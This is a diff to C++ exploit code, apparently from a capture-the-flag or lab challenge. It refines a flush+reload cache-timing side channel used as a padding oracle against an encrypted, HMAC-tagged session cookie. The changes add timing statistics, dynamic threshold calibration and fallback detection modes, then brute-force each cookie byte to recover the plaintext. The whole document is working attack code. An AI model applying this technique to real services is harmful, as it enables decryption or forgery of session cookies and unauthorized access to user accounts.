@@ -162,15 +162,30 @@ uint64_t measure_median_probe(simple_networking::TCPClient* client, const std::s
 }
 
 // Count cache hits (probe time < threshold)
-int count_hits(simple_networking::TCPClient* client, const std::string& cookie, int samples) {
+int count_hits(simple_networking::TCPClient* client, const std::string& cookie, int samples, uint64_t threshold) {
   int hits = 0;
 
   for (int i = 0; i < samples; i++) {
     uint64_t t = flush_reload_once(client, cookie);
-    if (t < g_threshold) hits++;
+    if (t < threshold) hits++;
   }
 
   return hits;
+}
+
+// Measure probe times and return statistics
+void measure_stats(simple_networking::TCPClient* client, const std::string& cookie, int samples,
+                   uint64_t& min_time, uint64_t& median_time, uint64_t& max_time) {
+  std::vector<uint64_t> times;
+
+  for (int i = 0; i < samples; i++) {
+    times.push_back(flush_reload_once(client, cookie));
+  }
+
+  std::sort(times.begin(), times.end());
+  min_time = times[0];
+  median_time = times[samples / 2];
+  max_time = times[samples - 1];
 }
 
 // ==========================================================================
@@ -204,26 +219,61 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
   // First, test the side channel with known valid/invalid
   std::cout << "[+] Testing side channel..." << std::endl;
 
-  // Valid cookie - should NOT call LogError
-  int valid_hits = count_hits(client, cookie, 20);
-  std::cout << "    Valid cookie: " << valid_hits << "/20 hits" << std::endl;
-
   // Corrupted cookie - should call LogError
   ByteVector corrupted = iv_ct;
   corrupted[20] = static_cast<std::byte>(static_cast<uint8_t>(corrupted[20]) ^ 0xFF);
   std::string corrupted_cookie = base64::base64_encode(corrupted) + "." + hmac_b64;
-  int invalid_hits = count_hits(client, corrupted_cookie, 20);
-  std::cout << "    Corrupted cookie: " << invalid_hits << "/20 hits" << std::endl;
 
-  bool use_cache_hits = (invalid_hits > valid_hits + 3);
-  std::cout << "[+] Side channel " << (use_cache_hits ? "WORKING" : "NOT WORKING")
-            << " - using " << (use_cache_hits ? "cache hits" : "median timing") << std::endl;
+  // Measure actual probe times for both
+  uint64_t valid_min, valid_med, valid_max;
+  uint64_t invalid_min, invalid_med, invalid_max;
+
+  measure_stats(client, cookie, 30, valid_min, valid_med, valid_max);
+  measure_stats(client, corrupted_cookie, 30, invalid_min, invalid_med, invalid_max);
+
+  std::cout << "    Valid cookie:   min=" << valid_min << " med=" << valid_med << " max=" << valid_max << std::endl;
+  std::cout << "    Corrupted cookie: min=" << invalid_min << " med=" << invalid_med << " max=" << invalid_max << std::endl;
+
+  // Try different thresholds
+  uint64_t dynamic_threshold = (valid_med + invalid_med) / 2;
+  std::cout << "    Dynamic threshold: " << dynamic_threshold << std::endl;
+
+  // Test with calibrated threshold
+  int valid_hits_cal = count_hits(client, cookie, 20, g_threshold);
+  int invalid_hits_cal = count_hits(client, corrupted_cookie, 20, g_threshold);
+  std::cout << "    With calibrated threshold (" << g_threshold << "): valid=" << valid_hits_cal << " invalid=" << invalid_hits_cal << std::endl;
+
+  // Test with dynamic threshold
+  int valid_hits_dyn = count_hits(client, cookie, 20, dynamic_threshold);
+  int invalid_hits_dyn = count_hits(client, corrupted_cookie, 20, dynamic_threshold);
+  std::cout << "    With dynamic threshold (" << dynamic_threshold << "): valid=" << valid_hits_dyn << " invalid=" << invalid_hits_dyn << std::endl;
+
+  // Determine which works better
+  bool use_cache_hits = false;
+  uint64_t use_threshold = g_threshold;
+
+  if (invalid_hits_dyn > valid_hits_dyn + 5) {
+    use_cache_hits = true;
+    use_threshold = dynamic_threshold;
+    std::cout << "[+] Side channel WORKING with dynamic threshold" << std::endl;
+  } else if (invalid_hits_cal > valid_hits_cal + 5) {
+    use_cache_hits = true;
+    use_threshold = g_threshold;
+    std::cout << "[+] Side channel WORKING with calibrated threshold" << std::endl;
+  } else if (invalid_med < valid_med * 0.95) {
+    // Invalid is faster? Check if LogError causes cache hit that speeds up our probe
+    std::cout << "[+] Trying inverted detection (invalid faster = cache hit)" << std::endl;
+    use_cache_hits = true;
+    use_threshold = dynamic_threshold;
+  } else {
+    std::cout << "[+] Side channel NOT WORKING - using minimum probe time" << std::endl;
+  }
 
   // Plaintext: "nobody-XXXXXXXX" + 0x01 padding = 16 bytes
   std::vector<uint8_t> intermediate(16, 0);
   std::vector<uint8_t> recovered(16, 0);
 
-  const int SAMPLES = use_cache_hits ? 10 : 3;
+  const int SAMPLES = use_cache_hits ? 7 : 3;
 
   // Padding oracle attack
   for (int pos = 15; pos >= 0; pos--) {
@@ -241,15 +291,14 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
     int best_guess = 0;
 
     if (use_cache_hits) {
-      // Find guess with MOST cache hits (LogError NOT called = valid padding)
-      // Wait, that's backwards. LogError called = cache hit. So valid padding = FEWER hits.
+      // LogError called = cache hit = valid padding should have FEWER hits
       int min_hits = INT_MAX;
 
       for (int guess = 0; guess < 256; guess++) {
         modified[pos] = static_cast<std::byte>(guess);
         std::string test_cookie = base64::base64_encode(modified) + "." + hmac_b64;
 
-        int hits = count_hits(client, test_cookie, SAMPLES);
+        int hits = count_hits(client, test_cookie, SAMPLES, use_threshold);
 
         if (hits < min_hits) {
           min_hits = hits;
@@ -257,17 +306,20 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
         }
       }
     } else {
-      // Fall back to median timing - valid padding might be slightly faster
-      uint64_t min_time = UINT64_MAX;
+      // Fall back to minimum probe time across many samples
+      // Valid padding = LogError NOT called = potentially different timing
+      uint64_t best_min = UINT64_MAX;
 
       for (int guess = 0; guess < 256; guess++) {
         modified[pos] = static_cast<std::byte>(guess);
         std::string test_cookie = base64::base64_encode(modified) + "." + hmac_b64;
 
-        uint64_t med = measure_median_probe(client, test_cookie, SAMPLES);
+        // Get minimum probe time over samples (most sensitive to cache state)
+        uint64_t min_t, med_t, max_t;
+        measure_stats(client, test_cookie, SAMPLES, min_t, med_t, max_t);
 
-        if (med < min_time) {
-          min_time = med;
+        if (min_t < best_min) {
+          best_min = min_t;
           best_guess = guess;
         }
       }
